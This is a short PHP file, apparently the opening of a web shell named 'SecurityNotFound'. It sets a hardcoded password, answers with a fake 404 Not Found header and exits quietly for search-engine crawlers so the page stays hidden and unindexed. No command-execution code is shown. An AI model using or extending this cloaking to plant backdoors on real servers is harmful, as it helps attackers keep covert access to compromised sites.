<?php

  /* Metadata
  >>>>>>>>>>>>>>>>> */
  define('__NAME__', 'SecurityNotFound');
  define('__AUTHOR__', '@CosasDePuma');

  /* Variables
  >>>>>>>>>>>>>>>>> */
  define('password', 'cosasdepuma');

  /* Headers
  >>>>>>>>>>>>>>>>> */
  header('HTTP/1.0 404 Not Found');
  header('X-Powered-By: Unicorns and kitties <3');

  /* Robots
  >>>>>>>>>>>>>>>>> */
  $robots = array(
    'Google', 'Yandex', 'MSNBot', 'Slurp', 'Rambler', 'ia_archiver'
  );

  foreach($robots as $robot)
    if( strpos($_SERVER['HTTP_USER_AGENT'],$robot) !== false )
      exit;

?>